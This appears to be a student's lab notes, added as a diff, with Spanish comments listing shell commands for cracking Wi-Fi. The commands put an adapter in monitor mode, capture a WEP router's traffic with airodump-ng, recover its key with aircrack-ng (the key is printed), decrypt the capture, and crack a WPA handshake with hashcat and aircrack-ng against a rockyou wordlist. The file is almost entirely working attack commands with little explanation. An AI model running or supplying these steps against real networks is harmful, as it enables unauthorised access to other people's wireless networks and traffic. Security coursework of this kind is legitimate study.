@@ -1,0 +1,86 @@
+
+// Cortar tarjeta de red interna
+sudo service NetworkManager stop
+
+// reponer wifi
+
+sudo service NetworkManager start
+
+
+// Configurar la tarjeta de red externa en modo monitor
+
+sudo iw wlx1027f5518cfe set type monitor
+
+// Escanear la red y detectar los router disponibles con la tarjeta de red instalada por usb
+
+sudo airodump-ng wlx1027f5518cfe
+
+// Se detecta el BSSID router configurado en tipo "wep"
+
+B0:48:7A:D2:DD:74
+
+// 
+
+sudo airodump-ng -c 6 --bssid B0:48:7A:D2:DD:74 -w captura_lab_3 wlx1027f5518cfe
+
+// Desencriptar mensaje??
+
+sudo aircrack-ng -b B0:48:7A:D2:DD:74 captura_lab_3-01.cap
+
+ 
+// Llave encontrada
+
+12:34:56:78:90
+
+//??
+
+airdecap-ng -w 12:34:56:78:90 captura_lab_3-01.cap
+
+
+// hcxtools
+
+sudo hcxpcapngtool -o handshake.hc22000 handshake.pcap
+
+
+
+// Ataque con hashcat
+
+    // Sin potfile
+        
+    hashcat -m 22000 handshake.hc22000 rockyou_mod.dic    
+
+    // Con potfile
+
+hashcat -m 22000 handshake.hc22000 rockyou_mod.dic --potfile-path=potfile.txt
+
+
+// Ataque con aircrack-ng
+
+    aircrack-ng -w rockyou_mod.dic handshake.pcap
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
